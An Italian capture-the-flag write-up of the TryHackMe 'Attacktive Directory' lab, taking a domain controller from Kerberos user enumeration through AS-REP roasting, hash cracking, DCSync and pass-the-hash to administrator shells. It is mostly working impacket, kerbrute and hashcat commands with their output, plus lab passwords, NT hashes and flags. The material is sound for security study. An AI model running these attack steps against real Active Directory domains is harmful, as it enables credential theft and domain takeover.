---
layout: writeup
lang: it
permalink: /writeups/attacktive-directory/
title: "Attacktive Directory"
ref: attacktive-directory
date: 2026-09-01
bare: true
platform: THM
os: Windows Server 2019 (Domain Controller)
difficulty: Medium
series: thm-windows
tags: [win, AD, kerberos, as-rep, dcsync, pass-the-hash, impacket]
txt: /writeups-files/attacktive-directory.txt
summary: "L'accesso iniziale passa da Kerberos stesso: kerbrute, AS-REP roast su svc-admin, credenziali base64 in una share backup, DCSync e pass-the-hash."
---

# Writeup — Attacktive Directory (TryHackMe)

OS: Windows Server 2019 (Domain Controller, build 17763)
Difficoltà: Medium
Data: 11 settembre 2026

---

## Sommario

Domain Controller di spookysec.local con tutta la superficie AD esposta. l'accesso iniziale non passa da un servizio bucato ma da Kerberos stesso: kerbrute enumera utenti validi interrogando il KDC senza provare password, e tra questi svc-admin ha la pre-autenticazione disabilitata. da lì un AS-REP roast restituisce un hash crackabile offline (management2005), le cui credenziali danno accesso a una share non standard chiamata backup che contiene un file di credenziali in chiaro, base64. l'account backup che ne esce ha i diritti di replica delle directory, quindi un DCSync completo con secretsdump e l'NT hash di Administrator. pass-the-hash e la macchina è chiusa

Catena: nmap sulle sole porte AD → spookysec.local → kerbrute userenum → svc-admin senza pre-auth → GetNPUsers → hashcat 18200 → management2005 → share backup → backup_credentials.txt base64 → account backup → secretsdump DCSync → NT hash Administrator → wmiexec pass-the-hash → 3 flag.

---

## strumenti e metodologie aggiuntive

durante la sessione è stato utilizzato un llm: per recupero dettagli su CVE, interpretazione di output grezzi, suggerimenti su vettori inesplorati in caso di blocco e spiegazione dettagliata di concetti tecnici. l'esecuzione e le scelte operative erano mie. il writeup è stato scritto da me e successivamente ripulito con lo stesso strumento.

---

## Premessa

room fatta dalla mia Kali virtualizzata su Linux Mint, VPN TryHackMe con sudo openvpn &#45;&#45;config ~/thm.ovpn e verifica su ip a show tun0.
tempo stimato dalla room 90 minuti, il mio obiettivo dichiarato era chiuderla in 30. non ci sono riuscito, ma non per la difficoltà tecnica: la catena in sé è lineare e senza passaggi oscuri. il tempo è andato quasi tutto in attrito operativo, ed è la cosa che mi porto dietro da questa sessione più delle flag
l'infrastruttura è stata pessima: praticamente ogni comando verso il target andava in timeout al primo tentativo e passava al secondo identico, e a metà room la macchina è morta del tutto (ping 100% packet loss, servizi silenti), costringendo al riavvio della lab machine e al cambio di IP da 10.113.168.168 a 10.113.182.0. la shell wmiexec è caduta tre volte,due delle quali su comandi banali.
in più due errori miei di preparazione: kerbrute scaricato ma non in PATH, e le due wordlist fornite dalla room che credevo di aver scaricato e che invece non erano mai arrivate sulla macchina.
avevo anche valutato di usare in apertura un tool AD che ho scritto io, ma l'ho scartato subito e lo spiego sotto.

---

## Fase 1 — Ricognizione

primo scan completo, si piazza sulla riga di apertura e non si muove:

nmap -sV -sC -Pn -p- &#45;&#45;min-rate 1000 -oN nmap_attacktive.txt 10.113.168.168

lo interrompo (qui Ctrl+C è sicuro, è una shell normale, non una reverse) e passo a uno scan mirato sulle sole porte tipiche di un ambiente Active Directory. questa scelta non è mia: l'introduzione della room dice esplicitamente di concentrarsi su AD e nient'altro, e con 90 minuti stimati e un target lento non ha senso spendere dieci minuti su 65535 porte per trovare quello che già sai essere lì.

nmap -sV -sC -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 &#45;&#45;min-rate 1000 -oN nmap_ad_fast.txt 10.113.168.168

Risultato:

53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-11 13:20:29Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
&#124; ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
&#124; rdp-ntlm-info: 
&#124;   Target_Name: THM-AD
&#124;   NetBIOS_Domain_Name: THM-AD
&#124;   NetBIOS_Computer_Name: ATTACKTIVEDIREC
&#124;   DNS_Domain_Name: spookysec.local
&#124;   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
&#124;   Product_Version: 10.0.17763
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
&#124; smb2-security-mode: 
&#124;   3.1.1: 
&#124;_    Message signing enabled and required

porta per porta, perché la percorro o la escludo:

53 DNS. Simple DNS Plus è il DNS integrato di Windows Server, coerente con un DC. non la percorro, non è il vettore della room, ma conferma il ruolo della macchina.
88 Kerberos. è la porta che conta. con il KDC raggiungibile posso enumerare utenti e chiedere ticket. il server time nell'output serve anche a controllare lo skew, perché Kerberos rifiuta le richieste se l'orologio è troppo sfasato. qui era -1s, nessun problema.
135 e 593 RPC ed RPC over HTTP. tenute da parte, sono la via su cui poi passerà DCSync via DRSUAPI, ma non le tocco direttamente a mano.
139 NetBIOS. legacy, ignorata: con 445 aperta non serve.
389 LDAP. qui esce il nome del dominio, spookysec.local, che è il dato che sblocca tutto il resto. da non autenticato non ci cavo altro.
445 SMB. non risponde alla version detection (microsoft-ds?) ma smb2-security-mode dice dialetto 3.1.1 con signing obbligatorio, quindi SMB1 è spento. dettaglio che tornerà.
464 kpasswd5. cambio password Kerberos. esclusa, non ha senso toccarla senza credenziali e senza voler modificare nulla.
636, 3268, 3269 LDAPS e Global Catalog. 3268 è solo il GC che ripete le stesse informazioni della 389, 636 e 3269 risultano tcpwrapped quindi non danno niente in più. escluse perché derivate.
3389 RDP. non la percorro come vettore di ingresso (nessun bruteforce, vedi sotto) ma l'output è il più generoso di tutti: hostname, NetBIOS domain THM-AD, FQDN del DC, e Product_Version 10.0.17763 che identifica Windows Server 2019. la tengo da parte come via di accesso post-credenziali, e la room stessa dice che le flag utente si possono prendere via RDP.
5985 WinRM. stessa logica: inutile adesso, potenziale via di esecuzione appena ho credenziali valide.

niente 80 o 443, nessun web. la superficie è tutta AD, esattamente come annunciato.

---

## Fase 2 — L'idea scartata: usare il mio tool

prima di muovermi ho pensato di lanciare un toolkit AD che ho scritto io (ad-attack-toolkit) sul target, dato che copre AS-REP roasting, Kerberoasting, enumerazione LDAP e verifica pass-the-hash, cioè quasi esattamente i vettori di questa room.

l'ho scartato subito, e il motivo è strutturale, non una limitazione da aggirare. quel tool non è uno strumento di sfruttamento, è uno strumento di assessment: dato l'IP di un DC e delle credenziali di dominio valide, anche a basso privilegio, dice quali misconfigurazioni sono presenti, con severità e remediation in un report. non esegue comandi remoti, la parte pass-the-hash si ferma alla verifica dell'autenticazione e alla visibilità delle share, e l'esecuzione la delega esplicitamente a psexec e wmiexec di impacket. anche il modulo AS-REP prende i target dal file di enumerazione LDAP, non da una lista di nomi.

la sua posizione naturale nella catena è dopo il primo accesso, come misura e documentazione dell'esposizione. Attacktive Directory invece parte esattamente dal punto che il tool assume già risolto: zero credenziali, e il primo passo è capire quali utenti esistano. non era il momento giusto, non era il mestiere giusto. l'ho ripreso a fine room, quando le credenziali c'erano, e in quel contesto ha avuto senso (Fase 8).

---

## Fase 3 — Enumerazione utenti via Kerberos

con 88 aperta il tool giusto è kerbrute, che enumera utenti validi mandando richieste AS-REQ al KDC e guardando come risponde. il punto importante: non prova password, quindi non incrementa i contatori di lockout. la room lo dice chiaramente, ed è per questo che non ho fatto nessun tipo di bruteforce credenziali in questa room: la policy di lockout del dominio non è enumerabile da fuori, e bruciare account su un DC è il modo più rapido per farsi notare e per bloccare utenti legittimi.

primo tentativo:

kerbrute userenum -d spookysec.local &#45;&#45;dc 10.113.168.168 ~/userlist.txt -t 50
kerbrute: command not found

scaricato ma non in PATH. lo prendo dalle release e lo richiamo col percorso:

wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O ~/kerbrute && chmod +x ~/kerbrute
~/kerbrute userenum -d spookysec.local &#45;&#45;dc 10.113.168.168 ~/userlist.txt -t 50

open /home/kali/userlist.txt: no such file or directory

qui viene fuori il secondo errore di preparazione: ls -la ~ mostra che né userlist.txt né passwordlist.txt sono mai arrivate. credevo di averle scaricate a inizio sessione e non era vero. le prendo dal repo indicato dalla room (sono liste ridotte apposta per questa macchina, non wordlist generiche, ed è il motivo per cui poi hashcat trova la password in quattro secondi):

wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt -O ~/userlist.txt
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt -O ~/passwordlist.txt

rilancio a 50 thread e resta fermo per minuti senza stampare nulla. lo interrompo e riprovo a 10:

~/kerbrute userenum -d spookysec.local &#45;&#45;dc 10.113.168.168 ~/userlist.txt -t 10

2026/09/11 09:31:22 >  [+] VALID USERNAME:       james@spookysec.local
2026/09/11 09:31:23 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2026/09/11 09:31:24 >  [+] VALID USERNAME:       James@spookysec.local
2026/09/11 09:31:24 >  [+] VALID USERNAME:       robin@spookysec.local
2026/09/11 09:31:27 >  [+] VALID USERNAME:       darkstar@spookysec.local
2026/09/11 09:31:29 >  [+] VALID USERNAME:       administrator@spookysec.local
2026/09/11 09:31:32 >  [+] VALID USERNAME:       backup@spookysec.local
2026/09/11 09:31:34 >  [+] VALID USERNAME:       paradox@spookysec.local
2026/09/11 09:31:41 >  [+] VALID USERNAME:       JAMES@spookysec.local
2026/09/11 09:31:44 >  [+] VALID USERNAME:       Robin@spookysec.local
2026/09/11 09:31:58 >  [+] VALID USERNAME:       Administrator@spookysec.local

a 50 thread il DC droppava le richieste, a 10 risponde. lezione operativa: su infrastruttura lenta la concorrenza alta non accelera, sopprime

i duplicati con maiuscole diverse (james/James/JAMES) sono la stessa identità, il sAMAccountName non è case sensitive. gli utenti reali sono sette: james, svc-admin, robin, darkstar, administrator, backup, paradox.
due nomi saltano all'occhio subito, ed erano prevedibili: svc-admin, che per convenzione è un service account, e backup, che per convenzione è legato a un job automatico. sono quelli su cui puntare.

---

## Fase 4 — AS-REP Roasting

l'obiettivo qui è trovare account con l'attributo "Do not require Kerberos preauthentication". su quegli account il KDC rilascia un AS-REP cifrato con la chiave derivata dalla password a chiunque lo chieda, senza che l'attaccante debba dimostrare di conoscere nulla. quel blocco cifrato è crackabile offline, quindi senza rumore e senza lockout.

primo tentativo con la userlist completa:

impacket-GetNPUsers spookysec.local/ -dc-ip 10.113.168.168 -usersfile ~/userlist.txt -format hashcat -outputfile ~/asrep.txt

resta appeso per minuti senza una riga. il motivo è che GetNPUsers prova gli utenti in sequenza, uno alla volta, su una VPN con latenza: migliaia di nomi diventano decine di minuti. kerbrute è parallelo, questo no.
non serve provarli tutti: so già chi esiste. riduco ai sette validi.

printf 'james\nsvc-admin\nrobin\ndarkstar\nadministrator\nbackup\nparadox\n' > ~/validusers.txt

anche così resta bloccato più di tre minuti. controllo se il problema è il target:

ip a show tun0 && ping -c 3 10.113.168.168
5: tun0: <POINTOPOINT,NOARP,UP,LOWER_UP> mtu 1380 qdisc noqueue state UP
3 packets transmitted, 0 received, 100% packet loss, time 2031ms

tunnel su, target morto. riavvio della lab machine, nuovo IP 10.113.182.0. per fortuna nmap e kerbrute non vanno rifatti, i dati che servono li ho già.

sul nuovo IP l'esecuzione singola resta silenziosa mentre lavora, e non sapere se sto perdendo tempo o no è il problema peggiore su questa infrastruttura. cambio approccio e giro un ciclo utente per utente, così ogni riga stampa appena finisce e il timeout non blocca tutto:

for u in $(cat ~/validusers.txt); do echo "== $u"; timeout 15 impacket-GetNPUsers spookysec.local/$u -dc-ip 10.113.182.0 -no-pass -format hashcat 2>&1 &#124; tail -3; done &#124; tee ~/asrep.txt

== james
[*] Getting TGT for james
== svc-admin
[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:7547f77b520993bab6d10e90b896308e$d18aa365cd4673e34f290103bb4e838d6496a6613927583aec0203d9e32211f90c659ee151740338083798c42aa29e722dc537e774c9bda4dfaf92d6837ab31845b2675d06d0aebf60dca7a7e328676fec8de2e5e475296c64dfa13272645c778cb4ab66870ab33efd2b4c0e9cc1099ef31c380117158bc4a0533605ba148e879e074af5a942fedff6ee674575fcda22a2d97ae504aed76f814a858c1b9e0dba6ba95b0e5bac366af9568e746b4248f374ba40f3642db49706896a491608df446203bb8ae8c61001ab900f415ad6e43fa32aaf8924491625a460e2b4eae53f19aba2d5b22138c7bf19a588cd6d95ee0030a5
== robin
[*] Getting TGT for robin
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
== darkstar
[*] Getting TGT for darkstar
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
== administrator
[*] Getting TGT for administrator
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
== backup
[*] Getting TGT for backup
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
== paradox
[*] Getting TGT for paradox
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set

un solo account roastabile, svc-admin. i cinque errori non sono rumore, servono: escludono gli altri e confermano che la misconfigurazione è isolata a un singolo service account, non una policy sbagliata a livello di dominio.
una nota sul mio comando: il tail -3 ha tagliato la riga di esito di james, quindi su quell'utente formalmente non ho la conferma a schermo. dettaglio marginale ma è un limite del modo in cui ho filtrato l'output, non del tool.

il prefisso dell'hash dice $krb5asrep$23$: etype 23, cioè RC4-HMAC, che corrisponde alla mode 18200 di hashcat. è la corrispondenza da controllare, perché con AES l'etype e la mode sarebbero diverse.

grep -o '\$krb5asrep\$.*' ~/asrep.txt > ~/svcadmin.hash
hashcat -m 18200 ~/svcadmin.hash /usr/share/wordlists/rockyou.txt &#45;&#45;force

&#46;&#46;&#46;:management2005

Session&#46;&#46;&#46;&#46;&#46;&#46;&#46;&#46;&#46;.: hashcat
Status&#46;&#46;&#46;&#46;&#46;&#46;&#46;&#46;&#46;..: Cracked
Hash.Mode&#46;&#46;&#46;&#46;&#46;&#46;..: 18200 (Kerberos 5, etype 23, AS-REP)
Time.Started&#46;&#46;&#46;..: Fri Sep 11 09:41:44 2026, (4 secs)
Progress&#46;&#46;&#46;&#46;&#46;&#46;&#46;&#46;&#46;: 5840896/14344385 (40.72%)

quattro secondi su CPU. credenziali di dominio: svc-admin / management2005

---

## Fase 5 — SMB e la share backup

con credenziali valide la prima cosa è vedere cosa condivide il DC.

timeout 60 smbclient -L //10.113.182.0/ -U 'spookysec.local\svc-admin%management2005'
do_connect: Connection to 10.113.182.0 failed (Error NT_STATUS_IO_TIMEOUT)

due volte di fila. non è il solito timeout dell'infrastruttura: smbclient di default negozia partendo da dialetti vecchi, e l'nmap aveva già detto che il DC parla 3.1.1 con signing obbligatorio, quindi SMB1 è disabilitato. la negoziazione muore lì. forzo il dialetto e la porta:

timeout 90 smbclient -L //10.113.182.0/ -U 'spookysec.local\svc-admin%management2005' -m SMB3 -p 445

        Sharename       Type      Comment
        &#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;-       &#45;&#45;&#45;&#45;      &#45;&#45;&#45;&#45;&#45;&#45;-
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.113.182.0 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 &#45;&#45; no workgroup available

l'errore finale è solo il fallback a SMB1 per il listing del workgroup, irrilevante: le share sono già uscite. sei in totale, cinque standard (ADMIN$, C$, IPC$, NETLOGON, SYSVOL) e una che non c'entra niente con un'installazione pulita: backup.

timeout 90 smbclient //10.113.182.0/backup -U 'spookysec.local\svc-admin%management2005' -m SMB3 -c 'ls; get backup_credentials.txt'

  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

qui mi sono stupito davvero. una share chiamata backup, leggibile da un service account a basso privilegio, con dentro un unico file da 48 byte che si chiama backup_credentials.txt. non un archivio, non un log: delle credenziali, messe lì.

cat backup_credentials.txt && base64 -d backup_credentials.txt
YmFja3VwQHNwb29raXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
backup@spookisec.local:backup2517860

base64, che non è offuscamento ma solo encoding: reversibile da chiunque, in un comando. il contenuto è direttamente user e password in chiaro. il dominio nella stringa decodificata è scritto spookisec, con la i: è un typo dentro il file lasciato dall'autore della room, il dominio reale resta spookysec.local e le credenziali funzionano su quello.

su cosa sia questo account ho fatto due ipotesi prima di testare:
la prima, dal nome e dal fatto che stia in una share di backup, è che sia l'account di servizio del sistema di backup del dominio, e che quindi abbia i diritti di replica delle directory (DS-Replication-Get-Changes e Get-Changes-All). è la configurazione tipica di questi account, e se fosse vera consentirebbe un DCSync completo, cioè la lettura di tutti gli hash del dominio.
la seconda, meno interessante, è che sia solo membro di Backup Operators, utile per leggere file privilegiati ma non per estrarre hash.
le due si distinguono con un test solo.

---

## Fase 6 — DCSync

timeout 120 impacket-secretsdump 'spookysec.local/backup:backup2517860@10.113.182.0' -just-dc-ntlm -outputfile ~/dcsync
[-] RemoteOperations failed: [Errno Connection error (10.113.182.0:445)] timed out

il solito primo tentativo. rilancio identico e passa:

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:f9a72b96635a275b00ef4a9b3e4c0139:::

ipotesi uno confermata: il metodo è DRSUAPI, cioè la replica, non la lettura di file. l'account backup ha i diritti di sincronizzazione con il DC, quindi legge tutto NTDS.DIT.

cose da annotare dal dump, anche quelle marginali:
l'LM hash è aad3b435b51404eeaad3b435b51404ee per tutti, che è il valore di LM vuoto, quindi lo storage LM è disabilitato. corretto, e mi evita di perdere tempo a crackarli.
a-spooks (RID 1601) ha esattamente lo stesso NT hash di Administrator (0e0363&#46;&#46;&#46;). non è una coincidenza: è un secondo account amministrativo con la stessa password. significa che anche cambiando la password di Administrator il dominio resterebbe compromesso da quell'account.
skidy e breakerofthings condividono a loro volta lo stesso hash tra loro, altro riuso.
c'è anche l'hash di krbtgt, che in un engagement reale sarebbe il pezzo per un Golden Ticket. qui non serve e non lo tocco, la strada più corta è già aperta.

---

## Fase 7 — Pass-the-Hash e recupero delle flag

con l'NT hash di Administrator non serve crackare niente: NTLM accetta l'hash come se fosse la password.

primo tentativo con psexec:

timeout 120 impacket-psexec 'spookysec.local/administrator@10.113.182.0' -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc

[*] Requesting shares on 10.113.182.0&#46;&#46;&#46;..
[*] Found writable share ADMIN$
[*] Uploading file ySRWXJvY.exe
[*] Opening SVCManager on 10.113.182.0&#46;&#46;&#46;..
[*] Creating service EftP on 10.113.182.0&#46;&#46;&#46;..
[*] Starting service EftP&#46;&#46;&#46;..
[-] Error performing the installation, cleaning up: Error occurs while reading from remote(104)

due cose qui. la prima: "Found writable share ADMIN$" è il primissimo campanello d'allarme, ed è la conferma che l'accesso amministrativo è reale e non solo un'autenticazione andata a buon fine. la seconda: guardando la sequenza si capisce quanto psexec sia rumoroso. carica un binario sulla share amministrativa, apre il Service Control Manager, crea un servizio con nome casuale e lo avvia. su un dominio monitorato quella catena è esattamente ciò che un EDR è tarato per vedere

l'errore l'ho ritentato più volte identico senza risultato. "Error occurs while reading from remote(104)" non distingue tra credenziali sbagliate, servizio bloccato e rete che cade, quindi insistere non porta informazione. cambio strumento, non approccio: wmiexec fa la stessa cosa (esecuzione remota) per un'altra via, DCOM e WMI invece di SVCManager, e non crea servizi. se funziona, il problema era il canale; se falliva anche lui, avrei dovuto guardare altrove.

timeout 120 impacket-wmiexec 'spookysec.local/administrator@10.113.182.0' -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
[-] [Errno Connection error (10.113.182.0:445)] timed out

rilancio identico, e passa:

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
C:\>

da qui in avanti Ctrl+C è vietato, chiuderebbe la sessione.

C:\>type C:\Users\Administrator\Desktop\root.txt
TryHackMe{4ctiveD1rectoryM4st3r}

le altre due flag non erano nei percorsi che avevo tirato a indovinare. cerco ricorsivamente:

dir /s /b C:\Users\*.txt

l'output è oltre 200 righe di percorsi, in gran parte junction ricorsive di "Application Data" annidate una dentro l'altra e cache di Cortana. l'ho passato per intero a un llm per estrarre i tre percorsi che mi servivano, invece di raffinare la query: filtri più restrittivi non stavano dando risultati affidabili, e ogni riapertura della shell su questa infrastruttura costa minuti. scelta di velocità, non di eleganza.

i percorsi utili:

C:\Users\svc-admin\Desktop\user.txt.txt
C:\Users\backup\Desktop\PrivEsc.txt
C:\Users\backup.THM-AD\Desktop\PrivEsc.txt
C:\Users\Administrator\Desktop\root.txt

la shell cade di nuovo, rientro e leggo una alla volta (concatenare con & la faceva cadere):

C:\>type "C:\Users\svc-admin\Desktop\user.txt.txt"
TryHackMe{K3rb3r0s_Pr3_4uth}

C:\>type "C:\Users\backup.THM-AD\Desktop\PrivEsc.txt"
TryHackMe{B4ckM3UpSc0tty!}

la flag di backup è duplicata su due profili, backup e backup.THM-AD: il secondo è il profilo creato al re-join dell'account al dominio, e il primo non restituiva niente. dettaglio di poco conto ma mi ha fatto perdere un giro di shell.

tre flag su tre.

---

## Fase 8 — Il mio tool, ripreso a credenziali ottenute

chiusa la room torno all'idea scartata in Fase 2, ora nel contesto per cui il tool è stato scritto: non bucare, ma dire cosa è vulnerabile a cosa e documentarlo.

git clone https://github.com/torchiachristian/ad-attack-toolkit.git ~/ad-attack-toolkit
cd ~/ad-attack-toolkit && python3 -m venv adtoolkit && source adtoolkit/bin/activate && pip install -r requirements.txt

python3 ad_enum.py &#45;&#45;dc-ip 10.113.182.0 &#45;&#45;domain spookysec.local -u backup -p backup2517860

[+] Connesso a 10.113.182.0:389 come backup@spookysec.local
[+] Base DN: DC=spookysec,DC=local
  krbtgt               krbtgt                    [SPN: kadmin/changepw]
  svc-admin            svc admin                 [NO_PREAUTH]
[+] Totale utenti trovati: 17
  Backup Operators                    (0 membri)
  Domain Admins                       (2 membri)
  Denied RODC Password Replication Group (8 membri)
  CompStaff                           (12 membri)
[+] Totale gruppi trovati: 50
  [!] svc-admin            svc admin
[!] 1 utenti vulnerabili ad AS-REP Roasting
  Nessun service account con SPN trovato.
  [*] Admin Spooks
  [*] Administrator
[+] 2 Domain Admin diretti trovati

quello che conferma: svc-admin unico NO_PREAUTH su 17 utenti, zero service account con SPN (quindi Kerberoasting su questa room non è praticabile, a differenza del mio lab dove è uno dei vettori principali), e i due Domain Admin diretti sono Administrator e a-spooks, coerente con i due NT hash identici del dump.
quello che aggiunge davvero: Backup Operators ha zero membri. è il dato che chiude in modo pulito l'ipotesi alternativa della Fase 5, e conferma che i privilegi dell'account backup erano di replica e non di appartenenza a quel gruppo. esce anche un gruppo custom CompStaff con 12 membri, non emerso da nessun passaggio manuale.

python3 pth.py &#45;&#45;target-ip 10.113.182.0 &#45;&#45;domain spookysec.local -u administrator &#45;&#45;nthash 0e0363213e37b94221497260b0bcb4fc

[+] Autenticazione PtH riuscita come SPOOKYSEC.LOCAL\administrator
[+] Server OS:   Windows 10.0 Build 17763
[+] Server Name: ATTACKTIVEDIREC
[*] Share accessibili:
  [+] ADMIN$ [+] backup [+] C$ [+] IPC$ [+] NETLOGON [+] SYSVOL

build 17763 allineata al Product_Version letto da nmap in Fase 1.

python3 asreproast.py &#45;&#45;dc-ip 10.113.182.0 &#45;&#45;domain spookysec.local

[+] Caricati 1 target dal file di enumerazione
  [+] svc-admin - hash AS-REP catturato (etype 23 / RC4-HMAC)

etype e mode identici alla cattura manuale con GetNPUsers, quindi doppia verifica indipendente.

infine l'assessment completo. l'ho lanciato passando la password via variabile d'ambiente invece che direttamente, per un bug noto che sto sistemando:

AD_PW='backup2517860' python3 ad_attack.py &#45;&#45;dc-ip 10.113.182.0 &#45;&#45;domain spookysec.local -u backup &#45;&#45;all &#45;&#45;password-env AD_PW &#45;&#45;pth &#45;&#45;pth-user administrator &#45;&#45;nthash 0e0363213e37b94221497260b0bcb4fc

assessment completato; stati={'enum': 'findings', 'asrep': 'findings', 'kerb': 'tested_no_findings', 'pth': 'findings'} counts={'asrep': 1, 'kerb': 0, 'domain_admins': 2}
[+] Report PDF: engagements/spookysec.local-20260911-101535/ad_attack_report.pdf

report PDF e summary.json generati, con findings e remediation.

va detto con onestà: come strumento offensivo su questa room il tool non ha aggiunto nulla, e non poteva. tutto quello che ha trovato lo avevo già trovato a mano, e lo ha trovato partendo dalle credenziali che la catena manuale aveva già ottenuto. il suo valore qui è stato un dato di esclusione (Backup Operators vuoto), la conferma indipendente della catena, e il report come materiale per questo writeup. il punto di design su cui intervenire l'ho capito proprio qui: il modulo AS-REP legge i target dal file di enumerazione LDAP, quindi dipende da credenziali valide. dandogli in input una lista di utenti sarebbe utilizzabile anche a credenziali zero, cioè esattamente nel punto in cui questa room comincia.

---

## Catena completa

nmap ridotto alle sole porte AD (su indicazione della room) → spookysec.local, DC AttacktiveDirectory, Windows Server 2019
→ kerbrute userenum sulla 88 (nessun bruteforce password, lockout policy non enumerabile) → 7 utenti validi
→ thread abbassati da 50 a 10 perché il DC droppava
→ GetNPUsers sui soli utenti validi → svc-admin unico senza pre-auth
→ hashcat -m 18200 (etype 23 / RC4) → management2005
→ smbclient con -m SMB3 forzato (SMB1 disabilitato sul DC) → share non standard backup
→ backup_credentials.txt base64 → backup / backup2517860
→ ipotesi diritti di replica confermata → secretsdump DRSUAPI → tutti gli hash del dominio
→ NT hash Administrator, identico a quello di a-spooks
→ psexec fallisce e fa rumore (ADMIN$ scrivibile, servizio creato) → wmiexec via WMI
→ shell come Administrator → dir /s → 3 flag
→ tool proprio ripreso a credenziali ottenute per assessment e report

---

## Lezioni apprese

su un'infrastruttura lenta la concorrenza alta non accelera niente, la soffoca: kerbrute a 50 thread restava muto, a 10 ha risolto in trentasei secondi. e quando un comando lavora in silenzio per minuti, conviene spendere dieci secondi per riscriverlo in modo che stampi avanzamento (il ciclo con timeout su GetNPUsers) invece di aspettare senza sapere se si sta perdendo tempo.

non ripetere lavoro che l'enumerazione ha già fatto. GetNPUsers sulla userlist completa è stato tempo buttato: sapevo già quali sette utenti esistessero, e ridurre l'input ha trasformato decine di minuti in un minuto.

quando un errore è vago (Error occurs while reading from remote(104)) insistere non produce informazione. cambiare strumento mantenendo lo stesso obiettivo, come passare da psexec a wmiexec, è sia più rapido sia diagnostico: distingue il canale dal privilegio.

gli errori di enumerazione valgono quanto i successi. i cinque "doesn't have UF_DONT_REQUIRE_PREAUTH set" e il Backup Operators a zero membri non sono rumore: il primo gruppo dimostra che la misconfigurazione è isolata, il secondo chiude un'ipotesi sbagliata sui privilegi.

uno strumento va usato nel punto della catena per cui è stato progettato. il mio toolkit non serve a ottenere accesso ma a misurare e documentare l'esposizione a partire da credenziali valide, quindi in apertura di questa room era strutturalmente fuori posto e in chiusura ha avuto senso. riconoscerlo prima di lanciarlo mi ha risparmiato tempo, e mi ha anche fatto vedere cosa manca al tool per coprire il caso a credenziali zero.

base64 non è sicurezza. un file da 48 byte in una share leggibile da un account a basso privilegio ha regalato le credenziali che hanno portato al controllo del dominio, e riconvertirlo è costato un comando

---

## Tool utilizzati

nmap, kerbrute (userenum), impacket-GetNPUsers, hashcat (-m 18200), smbclient (-m SMB3), impacket-secretsdump (DRSUAPI, -just-dc-ntlm), impacket-psexec, impacket-wmiexec, ad-attack-toolkit (ad_enum.py, asreproast.py, pth.py, ad_attack.py)
